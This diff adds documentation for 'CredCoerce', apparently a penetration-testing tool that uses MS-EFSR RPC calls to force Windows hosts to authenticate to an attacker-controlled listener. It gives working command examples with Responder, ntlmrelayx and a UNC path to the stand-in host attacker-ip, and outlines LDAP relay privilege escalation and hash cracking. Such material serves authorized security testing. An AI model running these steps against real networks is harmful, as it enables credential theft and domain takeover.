@@ -1,0 +1,167 @@
+---
+title: "CredCoerce"
+description: "Send RPC calls to coerce a target system into authenticating to a remote listener — useful for credential capture and relay attacks."
+---
+
+`CredCoerce` sends RPC calls to a target Windows system that cause it to initiate an outbound authentication attempt to a path you control. You capture or relay the resulting credentials with a listener such as Responder or `ntlmrelayx`. This technique is commonly used in internal penetration tests to move laterally or escalate privileges.
+
+## Synopsis
+
+```bash
+CredCoerce [options] -Techniques <ComponentSelector[]> <ServerName> <VictimPath>
+```
+
+## Parameters
+
+<ParamField path="ServerName" type="string" required>
+  Hostname or IP address of the target system to coerce.
+</ParamField>
+
+<ParamField path="VictimPath" type="string" required>
+  UNC path or resource path to embed in the RPC call. The target system will attempt to access this path, triggering an outbound authentication to the host in the path (e.g., `\\attacker-ip\share`).
+</ParamField>
+
+## Options
+
+<ParamField path="-Techniques" type="ComponentSelector[]" required>
+  One or more coercion techniques to attempt. Use `*` to try all available techniques. See the table below for all supported values.
+</ParamField>
+
+<ParamField path="-ConsoleOutputStyle (-OutputStyle)" type="string">
+  Output format: `Freeform`, `Raw`, `Table`, `List`, `Csv`, `Tsv`, `Json`.
+</ParamField>
+
+<ParamField path="-SpnOverride" type="string">
+  Override the SPN used during authentication.
+</ParamField>
+
+<ParamField path="-Socks5" type="string">
+  SOCKS5 proxy endpoint (`host:port`).
+</ParamField>
+
+## Coercion techniques
+
+All available techniques use the **MS-EFSR** (Encrypting File System Remote) RPC interface.
+
+| Technique | Interface | Description |
+|---|---|---|
+| `*` | — | Attempt all available techniques |
+| `Efs.OpenFile` | MS-EFSR | Call `EfsRpcOpenFileRaw` with the victim path |
+| `Efs.EncryptFile` | MS-EFSR | Call `EfsRpcEncryptFileSrv` with the victim path |
+| `Efs.DecryptFile` | MS-EFSR | Call `EfsRpcDecryptFileSrv` with the victim path |
+| `Efs.QueryUsersOnFile` | MS-EFSR | Call `EfsRpcQueryUsersOnFile` with the victim path |
+| `Efs.QueryRecoveryAgents` | MS-EFSR | Call `EfsRpcQueryRecoveryAgents` with the victim path |
+| `Efs.RemoveUsersFromFile` | MS-EFSR | Call `EfsRpcRemoveUsersFromFile` with the victim path |
+| `Efs.AddUsersToFile` | MS-EFSR | Call `EfsRpcAddUsersToFile` with the victim path |
+| `Efs.FileKeyInfo` | MS-EFSR | Call `EfsRpcFileKeyInfo` with the victim path |
+| `Efs.DuplicateEncryptionInfoFile` | MS-EFSR | Call `EfsRpcDuplicateEncryptionInfoFile` with the victim path |
+| `Efs.AddUsersToFileEx` | MS-EFSR | Call `EfsRpcAddUsersToFileEx` with the victim path |
+| `Efs.FileKeyInfoEx` | MS-EFSR | Call `EfsRpcFileKeyInfoEx` with the victim path |
+| `Efs.GetEncryptedFileMetadata` | MS-EFSR | Call `EfsRpcGetEncryptedFileMetadata` with the victim path |
+| `Efs.SetEncryptedFileMetadata` | MS-EFSR | Call `EfsRpcSetEncryptedFileMetadata` with the victim path |
+| `Efs.EncryptFileExSrv` | MS-EFSR | Call `EfsRpcEncryptFileExSrv` with the victim path |
+
+## Authentication
+
+<AccordionGroup>
+  <Accordion title="Credentials">
+    <ParamField path="-UserName (-u)" type="string">
+      User name (without domain) to authenticate to the target with.
+    </ParamField>
+    <ParamField path="-UserDomain (-ud)" type="string">
+      Domain of the authenticating user.
+    </ParamField>
+    <ParamField path="-Password (-p)" type="string">
+      Password.
+    </ParamField>
+    <ParamField path="-NtlmHash" type="string">
+      NTLM hash for pass-the-hash authentication.
+    </ParamField>
+    <ParamField path="-Anonymous" type="boolean">
+      Use anonymous authentication.
+    </ParamField>
+  </Accordion>
+
+  <Accordion title="Kerberos">
+    <ParamField path="-AesKey" type="string">
+      AES-128 or AES-256 Kerberos session key.
+    </ParamField>
+    <ParamField path="-Tgt" type="string">
+      TGT file path (`.kirbi` or ccache format).
+    </ParamField>
+    <ParamField path="-Kdc (-K)" type="string">
+      KDC endpoint (`host:port`).
+    </ParamField>
+    <ParamField path="-S4UserName" type="string">
+      User to impersonate via S4U2self.
+    </ParamField>
+  </Accordion>
+
+  <Accordion title="Connection">
+    <ParamField path="-HostAddress (-ha)" type="string[]">
+      Override network address(es) of the server.
+    </ParamField>
+    <ParamField path="-UseTcp6Only (-6)" type="boolean">
+      Use TCP over IPv6 only.
+    </ParamField>
+    <ParamField path="-UseTcp4Only (-4)" type="boolean">
+      Use TCP over IPv4 only.
+    </ParamField>
+  </Accordion>
+</AccordionGroup>
+
+## Examples
+
+<Steps>
+  <Step title="Start a credential listener">
+    On your attacker machine, start a listener to capture or relay credentials:
+
+    ```bash
+    # Using Responder (capture)
+    responder -I eth0
+
+    # Or using ntlmrelayx (relay)
+    ntlmrelayx.py -t smb://target-ip
+    ```
+  </Step>
+
+  <Step title="Coerce authentication with all EFS techniques">
+    ```bash
+    CredCoerce -UserName milchick@LUMON -Password Br3@kr00m! -Techniques * LUMON-FS1 \\\\attacker-ip\\share
+    ```
+
+    The target (`LUMON-FS1`) attempts to authenticate to `\\attacker-ip\share`, which your listener captures.
+  </Step>
+
+  <Step title="Try a specific technique">
+    ```bash
+    CredCoerce -UserName milchick@LUMON -Password Br3@kr00m! -Techniques Efs.OpenFile LUMON-FS1 \\\\attacker-ip\\share
+    ```
+  </Step>
+
+  <Step title="Authenticate to the target using Kerberos">
+    ```bash
+    CredCoerce -Kdc 10.66.0.11 -AesKey <hex-aes-key> -Techniques * LUMON-FS1 \\\\attacker-ip\\share
+    ```
+  </Step>
+</Steps>
+
+<Warning>
+Credential coercion triggers real outbound network connections from the target system. Ensure your engagement authorizes this activity and that you control the listener receiving the credentials.
+</Warning>
+
+## Common usage patterns
+
+<AccordionGroup>
+  <Accordion title="NTLM relay to LDAP for privilege escalation">
+    Coerce a domain controller or privileged machine to authenticate to an LDAP relay, which can be used to add privileges:
+
+    1. Start `ntlmrelayx` targeting LDAP on another domain controller.
+    2. Run `CredCoerce` against the victim machine with a path pointing to your relay listener.
+    3. The relay authenticates to LDAP on your behalf and performs the privileged operation.
+  </Accordion>
+
+  <Accordion title="Capturing machine account hashes">
+    When the target is a computer account (rather than a user), the outbound authentication uses the machine account credentials. These Net-NTLM hashes can be cracked offline or relayed to services that accept machine account authentication.
+  </Accordion>
+</AccordionGroup>
